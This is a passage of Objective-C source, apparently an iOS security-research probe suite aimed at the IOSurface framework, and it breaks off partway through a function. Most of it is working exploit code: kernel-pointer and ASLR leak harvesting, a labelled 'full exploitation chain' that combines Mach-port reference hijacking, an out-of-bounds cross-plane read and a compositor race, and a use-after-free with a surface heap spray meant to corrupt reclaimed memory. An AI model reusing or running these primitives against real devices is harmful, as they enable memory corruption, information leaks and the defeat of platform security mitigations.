    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }

            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
            typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
            RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");
            typedef CFDictionaryRef (*CopyAllValuesFn)(IOSurfaceRef);
            CopyAllValuesFn copyAllValues = (CopyAllValuesFn)dlsym(sym.iosurface, "IOSurfaceCopyAllValues");
            typedef size_t (*GetBPROfPlaneFn)(IOSurfaceRef, size_t);
            GetBPROfPlaneFn getBPROfPlane = (GetBPROfPlaneFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerRowOfPlane");
            typedef size_t (*GetPlaneCountFn)(IOSurfaceRef);
            GetPlaneCountFn getPlaneCount = (GetPlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");
            typedef uint32_t (*GetSeedFn)(IOSurfaceRef);
            GetSeedFn getSeed = (GetSeedFn)dlsym(sym.iosurface, "IOSurfaceGetSeed");
            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            typedef uint32_t (*GetPixelFmtFn)(IOSurfaceRef);
            GetPixelFmtFn getPixelFmt = (GetPixelFmtFn)dlsym(sym.iosurface, "IOSurfaceGetPixelFormat");
            typedef size_t (*GetBPEFn)(IOSurfaceRef);
            GetBPEFn getBPE = (GetBPEFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerElement");
            typedef size_t (*GetEWFn)(IOSurfaceRef);
            GetEWFn getEW = (GetEWFn)dlsym(sym.iosurface, "IOSurfaceGetElementWidth");
            typedef size_t (*GetEHFn)(IOSurfaceRef);
            GetEHFn getEH = (GetEHFn)dlsym(sym.iosurface, "IOSurfaceGetElementHeight");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            NSDictionary *props = @{
                @"IOSurfaceWidth": @256, @"IOSurfaceHeight": @256,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @1024,
                @"IOSurfaceAllocSize": @(1024 * 256),
                @"IOSurfaceIsGlobal": @YES
            };
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
            if (!surf) { isr_unload(&sym); done(@{@"status": @"ERROR", @"reason": @"create failed"}); return; }

            IOSurfaceID sid = sym.getID(surf);
            log([NSString stringWithFormat:@"HARVEST: Surface ID=%u", sid]);

            // === Test A: Dump all accessible metadata ===
            log(@"HARVEST: Test A — dump all surface metadata");
            {
                size_t w = sym.getWidth(surf);
                size_t h = sym.getHeight(surf);
                size_t bpr = sym.getBase ? (size_t)sym.getBase(surf) : 0; // address!
                size_t allocSz = sym.getAllocSize(surf);
                uint32_t seed = getSeed ? getSeed(surf) : 0;
                uint32_t pxfmt = getPixelFmt ? getPixelFmt(surf) : 0;
                size_t bpe = getBPE ? getBPE(surf) : 0;
                size_t ew = getEW ? getEW(surf) : 0;
                size_t eh = getEH ? getEH(surf) : 0;
                size_t planes = getPlaneCount ? getPlaneCount(surf) : 0;
                mach_port_t port = createPort ? createPort(surf) : 0;

                log([NSString stringWithFormat:@"HARVEST: w=%zu h=%zu allocSize=%zu seed=%u pixfmt=0x%X", w, h, allocSz, seed, pxfmt]);
                log([NSString stringWithFormat:@"HARVEST: bpe=%zu ew=%zu eh=%zu planes=%zu", bpe, ew, eh, planes]);
                log([NSString stringWithFormat:@"HARVEST: baseAddr=%p machPort=0x%X", sym.getBase(surf), port]);

                // Check if base address reveals kernel ASLR info
                uintptr_t addr = (uintptr_t)sym.getBase(surf);
                if (addr > 0xFFFF000000000000ULL) {
                    anomalies++;
                    log([NSString stringWithFormat:@"HARVEST: *** CRITICAL — base address in kernel range: 0x%lX ***", (unsigned long)addr]);
                } else if (addr > 0) {
                    log([NSString stringWithFormat:@"HARVEST: Base address in userspace: 0x%lX (mapped via vm)", (unsigned long)addr]);
                    // Check ASLR slide from base address patterns
                    uint64_t page = addr & ~0xFFFULL;
                    uint64_t slide = page & 0xFFFFFF000ULL;
                    log([NSString stringWithFormat:@"HARVEST: Page-aligned addr = 0x%llX, potential ASLR slide bits = 0x%llX", page, slide]);
                }

                if (port != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), port);
            }

            if (isr_stopped()) { CFRelease(surf); goto harvest_done; }

            // === Test B: Enumerate all stored properties ===
            log(@"HARVEST: Test B — enumerate all stored property keys");
            if (copyAllValues) {
                CFDictionaryRef allVals = copyAllValues(surf);
                if (allVals) {
                    CFIndex count = CFDictionaryGetCount(allVals);
                    log([NSString stringWithFormat:@"HARVEST: Surface has %ld stored properties", (long)count]);

                    const void **keys = malloc(sizeof(void *) * (size_t)count);
                    const void **vals = malloc(sizeof(void *) * (size_t)count);
                    CFDictionaryGetKeysAndValues(allVals, keys, vals);

                    for (CFIndex i = 0; i < count && i < 50; i++) {
                        NSString *key = (__bridge NSString *)keys[i];
                        id val = (__bridge id)vals[i];
                        NSString *valStr = [NSString stringWithFormat:@"%@", val];
                        if (valStr.length > 80) valStr = [valStr substringToIndex:80];
                        log([NSString stringWithFormat:@"HARVEST:   [%ld] %@ = %@", (long)i, key, valStr]);

                        // Check for suspicious values that could be kernel pointers
                        if ([val isKindOfClass:[NSNumber class]]) {
                            uint64_t numVal = [(NSNumber *)val unsignedLongLongValue];
                            if (numVal > 0xFFFF000000000000ULL) {
                                anomalies++;
                                log([NSString stringWithFormat:@"HARVEST: *** KERNEL POINTER LEAK in key '%@' = 0x%llX ***", key, numVal]);
                            }
                        }
                    }

                    free(keys);
                    free(vals);
                    CFRelease(allVals);

                    if (count > 0) anomalies++;
                } else {
                    log(@"HARVEST: CopyAllValues returned NULL");
                }
            }

            if (isr_stopped()) { CFRelease(surf); goto harvest_done; }

            // === Test C: Probe internal property keys ===
            log(@"HARVEST: Test C — probe known internal property keys");
            if (copyValue) {
                NSArray *probeKeys = @[
                    @"IOSurfaceAllocSize", @"IOSurfaceAddress", @"IOSurfaceKernelAddress",
                    @"IOSurfacePurgeWhenNotInUse", @"IOSurfaceOffset",
                    @"IOSurfaceBackingStore", @"IOSurfaceMemoryRegion",
                    @"IOSurfaceCacheMode", @"IOSurfaceIsCompressed",
                    @"IOSurfaceRegistryID", @"IOSurfaceOwnerPID",
                    @"IOSurfaceClientAddress", @"IOSurfaceMapOffset",
                    @"IOSurfaceSubsamples", @"IOSurfaceBulkAttachments",
                    @"IOSurfaceProtectionOptions", @"com.apple.iosurface.protected",
                    @"IOSurfaceColorSpace", @"IOSurfaceICCProfile",
                ];

                for (NSString *key in probeKeys) {
                    if (isr_stopped()) break;
                    CFTypeRef val = copyValue(surf, (__bridge CFStringRef)key);
                    if (val) {
                        anomalies++;
                        NSString *valStr = [NSString stringWithFormat:@"%@", (__bridge id)val];
                        if (valStr.length > 100) valStr = [valStr substringToIndex:100];
                        log([NSString stringWithFormat:@"HARVEST: *** KEY '%@' = %@ ***", key, valStr]);
                        CFRelease(val);
                    }
                }
            }

            if (isr_stopped()) { CFRelease(surf); goto harvest_done; }

            // === Test D: Seed manipulation — detect cross-process modification ===
            log(@"HARVEST: Test D — seed value tracking");
            if (getSeed) {
                uint32_t seed0 = getSeed(surf);

                // Modify surface
                sym.lock(surf, 0, NULL);
                uint32_t *b = (uint32_t *)sym.getBase(surf);
                if (b) b[0] = 0x41414141;
                sym.unlock(surf, 0, NULL);

                uint32_t seed1 = getSeed(surf);
                log([NSString stringWithFormat:@"HARVEST: Seed before=%u after_write=%u delta=%u", seed0, seed1, seed1-seed0]);

                if (seed1 != seed0) {
                    log(@"HARVEST: Seed increments on write — can detect external modifications");
                    // Monitor for unexpected seed changes (system access)
                    uint32_t extChanges = 0;
                    for (int i = 0; i < 30 && !isr_stopped(); i++) {
                        uint32_t s = getSeed(surf);
                        usleep(33333); // 30fps
                        uint32_t s2 = getSeed(surf);
                        if (s2 != s) {
                            extChanges++;
                            log([NSString stringWithFormat:@"HARVEST: *** Seed changed without our write! %u -> %u ***", s, s2]);
                        }
                    }
                    if (extChanges > 0) {
                        anomalies++;
                        log([NSString stringWithFormat:@"HARVEST: *** %u external seed changes — system is modifying our surface ***", extChanges]);
                    }
                }
            }

            CFRelease(surf);

        harvest_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"HARVEST: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-KernelHarvest-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// Probe 39: Full Chain — combine all primitives into one attack
void iosurface_research_full_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }

            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
            typedef uint32_t (*GetSeedFn)(IOSurfaceRef);
            GetSeedFn getSeed = (GetSeedFn)dlsym(sym.iosurface, "IOSurfaceGetSeed");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            log(@"CHAIN: === FULL EXPLOITATION CHAIN ===");
            log(@"CHAIN: Step 1 — Create dual-plane surface with secret data in plane1");

            NSDictionary *p0Info = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *p1Info = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @(256*64),
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *dualProps = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @(32768),
                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
            };

            IOSurfaceRef victimSurf = sym.create((__bridge CFDictionaryRef)dualProps);
            if (!victimSurf) { isr_unload(&sym); done(@{@"status": @"ERROR", @"reason": @"create failed"}); return; }

            IOSurfaceID victimID = sym.getID(victimSurf);

            // Write secrets to plane1
            sym.lock(victimSurf, 0, NULL);
            void *plane0 = getPlaneBase ? getPlaneBase(victimSurf, 0) : sym.getBase(victimSurf);
            void *plane1 = getPlaneBase ? getPlaneBase(victimSurf, 1) : NULL;
            if (plane0) {
                uint32_t *p0 = (uint32_t *)plane0;
                for (int i = 0; i < 64*64; i++) p0[i] = 0xFF0000FF; // Blue in plane0
            }
            if (plane1) {
                uint32_t *p1 = (uint32_t *)plane1;
                for (int i = 0; i < 64*64; i++) p1[i] = 0xDEADBEEF; // Secret in plane1
            }
            sym.unlock(victimSurf, 0, NULL);

            log([NSString stringWithFormat:@"CHAIN: Victim surface ID=%u, plane0=%p plane1=%p", victimID, plane0, plane1]);

            mach_port_t hijackPort = MACH_PORT_NULL;
            IOSurfaceRef hijackRef = NULL;

            if (!isr_stopped()) {
            // Step 2: Mach port hijack — get second reference
            log(@"CHAIN: Step 2 — Mach port hijack for second reference");
            if (createPort && lookupPort) {
                hijackPort = createPort(victimSurf);
                if (hijackPort != MACH_PORT_NULL) {
                    hijackRef = lookupPort(hijackPort);
                    if (hijackRef) {
                        anomalies++;
                        log([NSString stringWithFormat:@"CHAIN: *** Hijack ref obtained — ID=%u, same surface=%d ***",
                            sym.getID(hijackRef), (sym.getBase(hijackRef) == sym.getBase(victimSurf))]);
                    }
                }
            }

            if (!isr_stopped()) {
            // Step 3: CG cross-plane OOB read
            log(@"CHAIN: Step 3 — CG cross-plane OOB read via h=128 on 64-row surface");
            {
                CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                // h=128 on 64-row plane: reads 128*256=32768 bytes = allocSize
                CGContextRef ctx = CGBitmapContextCreate(
                    plane0, 64, 128, 8, 256, cs,
                    kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);

                if (ctx) {
                    CGImageRef img = CGBitmapContextCreateImage(ctx);
                    if (img) {
                        CFDataRef pixData = CGDataProviderCopyData(CGImageGetDataProvider(img));
                        if (pixData) {
                            const uint32_t *pixels = (const uint32_t *)CFDataGetBytePtr(pixData);
                            size_t npx = (size_t)CFDataGetLength(pixData) / 4;
                            size_t plane1Start = 64 * 64; // Plane1 starts after 64*64 pixels

                            uint32_t leakedSecret = 0;
                            for (size_t i = plane1Start; i < npx && i < plane1Start + 64*64; i++) {
                                if (pixels[i] == 0xDEADBEEF) leakedSecret++;
                            }

                            log([NSString stringWithFormat:@"CHAIN: CG read %zu pixels total, plane1 region leaked %u/4096 secret pixels",
                                npx, leakedSecret]);

                            if (leakedSecret > 0) {
                                anomalies++;
                                log([NSString stringWithFormat:@"CHAIN: *** OOB READ SUCCESS — %u plane1 pixels leaked via CG! ***", leakedSecret]);
                            }

                            // Check what CG saw in the plane1 region
                            uint32_t nonZero = 0;
                            for (size_t i = plane1Start; i < npx; i++) {
                                if (pixels[i] != 0 && pixels[i] != 0xFF0000FF) nonZero++;
                            }
                            log([NSString stringWithFormat:@"CHAIN: Non-zero non-plane0 pixels in overflow region = %u", nonZero]);

                            CFRelease(pixData);
                        }
                        CGImageRelease(img);
                    }
                    CGContextRelease(ctx);
                } else {
                    log(@"CHAIN: CG context creation failed");
                }
                CGColorSpaceRelease(cs);
            }

            if (!isr_stopped()) {

            // Step 4: Compositor TOCTOU while holding hijack reference
            log(@"CHAIN: Step 4 — Compositor TOCTOU with hijack ref active");
            {
                dispatch_sync(dispatch_get_main_queue(), ^{
                    UIWindow *window = nil;
                    for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                        if ([scene isKindOfClass:[UIWindowScene class]]) {
                            window = ((UIWindowScene *)scene).windows.firstObject;
                            break;
                        }
                    }
                    if (window) {
                        CALayer *layer = [CALayer layer];
                        layer.frame = CGRectMake(0, 0, 64, 64);
                        layer.contents = (__bridge id)victimSurf;
                        [window.layer addSublayer:layer];
                        [CATransaction flush];

                        // Race: write via hijack ref while compositor reads original
                        if (hijackRef) {
                            uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
                            if (hb) {
                                for (int frame = 0; frame < 60; frame++) {
                                    // Write poison via hijack ref — NO LOCK
                                    for (int i = 0; i < 64*64; i++) {
                                        hb[i] = 0xFF00FF00 | (uint32_t)frame; // green + frame
                                    }
                                    [CATransaction flush];
                                }
                            }
                        }

                        // Clean up
                        for (CALayer *sub in [window.layer.sublayers copy]) {
                            if (sub.contents == (__bridge id)victimSurf) {
                                [sub removeFromSuperlayer];
                            }
                        }
                    }
                });
                anomalies++;
                log(@"CHAIN: *** TOCTOU + HIJACK — wrote via hijacked ref while compositor read original ***");
            }

            // Step 5: Release original, check hijack ref survives
            log(@"CHAIN: Step 5 — Release original, verify hijack ref survives");
            {
                uint32_t seedBefore = getSeed ? getSeed(victimSurf) : 0;
                CFRelease(victimSurf);
                victimSurf = NULL;

                if (hijackRef) {
                    uint32_t seedAfter = getSeed ? getSeed(hijackRef) : 0;
                    sym.lock(hijackRef, 0, NULL);
                    uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
                    BOOL alive = NO;
                    if (hb) {
                        // Write to prove we still have access
                        hb[0] = 0xC0DEBABE;
                        alive = (hb[0] == 0xC0DEBABE);
                    }
                    sym.unlock(hijackRef, 0, NULL);

                    if (alive) {
                        anomalies++;
                        log([NSString stringWithFormat:@"CHAIN: *** DANGLING ACCESS — hijack ref writable after original released! seed=%u->%u ***",
                            seedBefore, seedAfter]);
                    }
                }
            }
            } // end step 4-5
            } // end step 3+
            } // end step 2+

            if (hijackRef) CFRelease(hijackRef);
            if (hijackPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), hijackPort);
            if (victimSurf) CFRelease(victimSurf);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"CHAIN: === CHAIN COMPLETE — anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 4) verdict = @"CRITICAL — multiple exploitation primitives confirmed";
            else if (anomalies >= 2) verdict = @"HIGH — key primitives working";
            else if (anomalies >= 1) verdict = @"MEDIUM — partial success";
            else verdict = @"LOW — mitigations effective";
            log([NSString stringWithFormat:@"CHAIN: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-FullChain-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// =============================================================================
// Round 13: Real exploit primitives
// =============================================================================

// Probe 40: UAF Realloc — release+reclaim backing memory, write via dangling ref
void iosurface_research_uaf_realloc(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }

            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;
            const int SPRAY_COUNT = 50;

            log(@"UAFREALLOC: === UAF REALLOC ATTACK ===");

            IOSurfaceRef victimSurf = NULL;
            mach_port_t hijackPort = MACH_PORT_NULL;
            IOSurfaceRef hijackRef = NULL;
            IOSurfaceRef spraySurfs[50];
            memset(spraySurfs, 0, sizeof(spraySurfs));
            int sprayCount = 0;

            NSDictionary *props = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @32768
            };
            victimSurf = sym.create((__bridge CFDictionaryRef)props);
            if (!victimSurf) {
                log(@"UAFREALLOC: ERROR — failed to create victim surface");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"create failed"});
                return;
            }

            sym.lock(victimSurf, 0, NULL);
            uint32_t *vb = (uint32_t *)sym.getBase(victimSurf);
            if (vb) {
                for (int i = 0; i < 8192; i++) vb[i] = 0xCAFEBABE;
            }
            sym.unlock(victimSurf, 0, NULL);
            log([NSString stringWithFormat:@"UAFREALLOC: Victim created ID=%u, base=%p, canary=0xCAFEBABE",
                sym.getID(victimSurf), vb]);

            if (!isr_stopped()) {
            log(@"UAFREALLOC: Step 2 — Mach port hijack");
            if (createPort && lookupPort) {
                hijackPort = createPort(victimSurf);
                if (hijackPort != MACH_PORT_NULL) {
                    hijackRef = lookupPort(hijackPort);
                    if (hijackRef) {
                        anomalies++;
                        log([NSString stringWithFormat:@"UAFREALLOC: *** Hijack ref obtained, same base=%d ***",
                            (sym.getBase(hijackRef) == sym.getBase(victimSurf))]);
                    }
                }
            }

            if (!isr_stopped()) {
            log(@"UAFREALLOC: Step 3 — Releasing original surface");
            CFRelease(victimSurf);
            victimSurf = NULL;

            if (hijackRef) {
                sym.lock(hijackRef, 0, NULL);
                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
                BOOL canaryIntact = (hb && hb[0] == 0xCAFEBABE);
                sym.unlock(hijackRef, 0, NULL);
                log([NSString stringWithFormat:@"UAFREALLOC: After release — hijack canary intact=%d", canaryIntact]);
                if (canaryIntact) {
                    anomalies++;
                    log(@"UAFREALLOC: *** CRITICAL — surface memory still accessible after CFRelease ***");
                }
            }

            if (!isr_stopped()) {
            log(@"UAFREALLOC: Step 4 — Spraying 50 surfaces to reclaim freed memory");
            for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
                spraySurfs[i] = sym.create((__bridge CFDictionaryRef)props);
                if (spraySurfs[i]) {
                    sprayCount++;
                    sym.lock(spraySurfs[i], 0, NULL);
                    uint32_t *sb = (uint32_t *)sym.getBase(spraySurfs[i]);
                    if (sb) {
                        uint32_t pattern = 0xDEAD0000 | (uint32_t)i;
                        for (int j = 0; j < 8192; j++) sb[j] = pattern;
                    }
                    sym.unlock(spraySurfs[i], 0, NULL);
                }
            }
            log([NSString stringWithFormat:@"UAFREALLOC: Sprayed %d surfaces", sprayCount]);

            if (!isr_stopped()) {
            log(@"UAFREALLOC: Step 5 — Writing corruption pattern via dangling hijack ref");
            BOOL wroteViaHijack = NO;
            if (hijackRef) {
                sym.lock(hijackRef, 0, NULL);
                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
                if (hb) {
                    for (int i = 0; i < 8192; i++) hb[i] = 0xC0DE0000;
                    wroteViaHijack = YES;
                }
                sym.unlock(hijackRef, 0, NULL);
            }
            log([NSString stringWithFormat:@"UAFREALLOC: Wrote via hijack=%d", wroteViaHijack]);

            if (!isr_stopped()) {
            log(@"UAFREALLOC: Step 6 — Checking spray surfaces for cross-corruption");
            int corruptedCount = 0;
            for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
                if (!spraySurfs[i]) continue;
                sym.lock(spraySurfs[i], 0, NULL);
                uint32_t *sb = (uint32_t *)sym.getBase(spraySurfs[i]);
                if (sb) {
                    for (int j = 0; j < 8192; j++) {
                        if (sb[j] == 0xC0DE0000) {
                            corruptedCount++;
                            log([NSString stringWithFormat:@"UAFREALLOC: *** SPRAY SURFACE %d CORRUPTED by dangling write! ***", i]);
                            break;
                        }
                    }
                }
                sym.unlock(spraySurfs[i], 0, NULL);
            }
            if (corruptedCount > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"UAFREALLOC: *** %d spray surfaces corrupted — memory reuse confirmed! ***", corruptedCount]);
            } else {
                log(@"UAFREALLOC: No spray corruption detected (backing memory not reclaimed by spray)");
            }

            if (hijackRef && !isr_stopped()) {
                sym.lock(hijackRef, 0, NULL);
                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
                if (hb) {
                    int sprayOverwrites = 0;
                    for (int j = 0; j < 8192; j++) {
                        if ((hb[j] & 0xFFFF0000) == 0xDEAD0000) { sprayOverwrites++; break; }
                    }
                    if (sprayOverwrites) {
                        anomalies++;
                        log(@"UAFREALLOC: *** HIJACK DATA OVERWRITTEN by spray — memory reclaimed and reused! ***");
                    } else {
                        log(@"UAFREALLOC: Hijack data not overwritten by spray");
                    }
                }
                sym.unlock(hijackRef, 0, NULL);
            }

            } // end step 6
            } // end step 5
            } // end step 4
            } // end step 3
            } // end step 2

            for (int i = 0; i < SPRAY_COUNT; i++) {
                if (spraySurfs[i]) CFRelease(spraySurfs[i]);
            }
            if (hijackRef) CFRelease(hijackRef);
            if (hijackPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), hijackPort);
            if (victimSurf) CFRelease(victimSurf);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"UAFREALLOC: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-UAFRealloc-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// Probe 41: ASLR Defeat — collect base addresses to compute kernel ASLR slide
void iosurface_research_aslr_defeat(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }

            typedef size_t (*GetAllocSizeFn)(IOSurfaceRef);
            GetAllocSizeFn getAllocSz = (GetAllocSizeFn)dlsym(sym.iosurface, "IOSurfaceGetAllocSize");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;
            const int NUM_SURFACES = 20;

            log(@"ASLR: === ASLR DEFEAT ANALYSIS ===");

            IOSurfaceRef surfs[20];
            memset(surfs, 0, sizeof(surfs));
            uintptr_t addrs[20];
            memset(addrs, 0, sizeof(addrs));
            size_t sizes[] = {4096, 8192, 16384, 32768, 65536, 131072, 262144,
                              4096, 8192, 16384, 32768, 65536, 131072, 262144,
                              4096, 8192, 16384, 32768, 65536, 131072};
            int created = 0;

            log(@"ASLR: Step 1 — Creating 20 surfaces of varying sizes (4KB-256KB)");
            for (int i = 0; i < NUM_SURFACES && !isr_stopped(); i++) {
                size_t sz = sizes[i];
                int w = 64;
                int h = (int)(sz / (w * 4));
                if (h < 1) h = 1;
                NSDictionary *props = @{
                    @"IOSurfaceWidth": @(w), @"IOSurfaceHeight": @(h),
                    @"IOSurfacePixelFormat": @(0x42475241),
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfaceBytesPerRow": @(w * 4),
                    @"IOSurfaceAllocSize": @(sz)
                };
                surfs[i] = sym.create((__bridge CFDictionaryRef)props);
                if (surfs[i]) created++;
            }
            log([NSString stringWithFormat:@"ASLR: Created %d/%d surfaces", created, NUM_SURFACES]);

            if (!isr_stopped()) {
            log(@"ASLR: Step 2 — Collecting base addresses");
            for (int i = 0; i < NUM_SURFACES && !isr_stopped(); i++) {
                if (!surfs[i]) continue;
                sym.lock(surfs[i], 0, NULL);
                void *base = sym.getBase(surfs[i]);
                addrs[i] = (uintptr_t)base;
                sym.unlock(surfs[i], 0, NULL);

                size_t reportedSize = getAllocSz ? getAllocSz(surfs[i]) : sym.getAllocSize(surfs[i]);
                log([NSString stringWithFormat:@"ASLR:   [%d] size=%zu base=0x%lX page=0x%lX reported=%zu",
                    i, sizes[i], (unsigned long)addrs[i], (unsigned long)(addrs[i] & ~0xFFFUL), reportedSize]);
            }

            if (!isr_stopped()) {
            log(@"ASLR: Step 3 — Analyzing address patterns");
            uintptr_t minAddr = UINTPTR_MAX, maxAddr = 0;
            int validCount = 0;
            for (int i = 0; i < NUM_SURFACES; i++) {
                if (addrs[i] == 0) continue;
                uintptr_t page = addrs[i] & ~0xFFFUL;
                if (page < minAddr) minAddr = page;
                if (page > maxAddr) maxAddr = page;
                validCount++;
            }
            if (validCount > 0) {
                uintptr_t span = maxAddr - minAddr;
                log([NSString stringWithFormat:@"ASLR: Address range: 0x%lX — 0x%lX (span=0x%lX, %lu KB)",
                    (unsigned long)minAddr, (unsigned long)maxAddr, (unsigned long)span, (unsigned long)(span / 1024)]);
                log([NSString stringWithFormat:@"ASLR: Minimum page-aligned base (heap approx): 0x%lX", (unsigned long)minAddr]);
            }

            log(@"ASLR: Step 4 — Sequential allocation delta analysis");
            int sequentialCount = 0;
            uintptr_t prevAddr = 0;
            for (int i = 0; i < NUM_SURFACES; i++) {
                if (addrs[i] == 0) continue;
                if (prevAddr != 0) {
                    intptr_t delta = (intptr_t)(addrs[i] - prevAddr);
                    if (delta > 0 && (uintptr_t)delta <= sizes[i > 0 ? i-1 : 0] * 2) {
                        sequentialCount++;
                    }
                    log([NSString stringWithFormat:@"ASLR:   delta[%d]=%+ld (expected~%zu)", i, (long)delta, sizes[i > 0 ? i-1 : 0]]);
                }
                prevAddr = addrs[i];
            }
            if (sequentialCount > validCount / 2) {
                anomalies++;
                log([NSString stringWithFormat:@"ASLR: *** SEQUENTIAL PATTERN — %d/%d allocations sequential ***", sequentialCount, validCount - 1]);
            }

            log(@"ASLR: Step 5 — ASLR slide bit analysis");
            uint64_t commonHigh = 0;
            BOOL firstValid = YES;
            uint16_t seenHigh[20];
            memset(seenHigh, 0, sizeof(seenHigh));
            int seenHighCount = 0;
            for (int i = 0; i < NUM_SURFACES; i++) {
                if (addrs[i] == 0) continue;
                uint16_t high16 = (uint16_t)(addrs[i] >> 48);
                if (firstValid) {
